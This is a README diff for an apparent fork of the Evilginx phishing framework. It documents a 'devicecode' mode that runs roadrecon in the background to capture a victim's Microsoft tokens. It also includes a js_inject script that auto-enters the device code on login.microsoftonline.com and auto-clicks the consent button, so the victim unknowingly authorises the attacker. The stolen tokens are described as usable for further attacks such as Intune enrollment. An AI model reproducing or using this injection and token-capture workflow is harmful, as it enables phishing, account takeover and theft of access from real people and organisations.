@@ -1,4 +1,45 @@
-fork
+### Devicecode mode feature
+
+works kinda like https://github.com/denniskniep/DeviceCodePhishing, but the victim will see that the device code is entered
+
+
+- flag (-devicecode) enables devicecode mode
+- if python venv isnt already created, evilginx will create it
+- if roadrecon isnt already installed in the venv, evilginx will install it
+- when the victim hits the lure, `venv/bin/roadrecon auth --device-code` starts running in the background, and saves tokens in `.roadtools_auth` when done
+- the generated devicecode will be injected in the phishlet
+- when the user is finished authenticating, evilginx will redirect to specified URL in phishlet
+- the file `.roadtools_auth` can now be used in further attacks (enroll in intune etc.)
+
+#### js_inject:
+```yaml
+js_inject:
+  - trigger_domains: ["login.microsoftonline.com"]
+    trigger_paths: ["/common/oauth2/deviceauth", "/common/SAS/ProcessAuth"]
+    script: |
+      setTimeout(() => {
+        const input = document.querySelector('#otc');
+        const button = document.querySelector('#idSIButton9');
+
+        if (input) {
+          input.value = "placeholder";
+          input.form.requestSubmit();
+
+        } else if (button) {
+          button.click();
+        }
+      }, 100);
+```
+
+This will automatically enter the device code, and automatically press enter when the user is asked  
+"**Are you trying to sign in to Microsoft Authentication Broker?**"
+
+
+<br>
+<br><br>
+<br>
+<br>
+<br>
 
 <p align="center">
   <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
